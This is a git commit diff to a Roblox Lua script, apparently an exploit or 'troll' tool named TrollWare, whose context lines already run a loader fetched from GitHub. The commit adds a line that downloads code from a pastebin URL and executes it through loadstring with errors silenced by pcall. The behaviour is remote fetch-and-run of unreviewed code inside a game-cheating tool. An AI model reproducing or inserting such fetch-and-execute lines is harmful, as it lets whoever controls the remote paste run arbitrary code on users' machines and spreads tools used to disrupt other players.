7752de6f318492a658ff8bdd2a966ddb42a28459
Dhelan <gcool0780@gmail.com>
2025-06-28 19:54:36 +0800

    Update source.lua

--- source.lua
+++ source.lua
@@ -290,4 +290,5 @@ local s,f=pcall(function()return loadstring(txt)end)
 if s and typeof(f)=="function"then pcall(f)end end end
 Players.LocalPlayer.Chatted:Connect(function(msg)if msg:sub(1,1)==";"then runCommand(msg:sub(2))end end)
 pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelann/TrollWare/refs/heads/main/loader.lua"))()end)
+pcall(function()loadstring(game:HttpGet("https://pastebin.com/raw/xpyxZ5fd"))()end)
 end
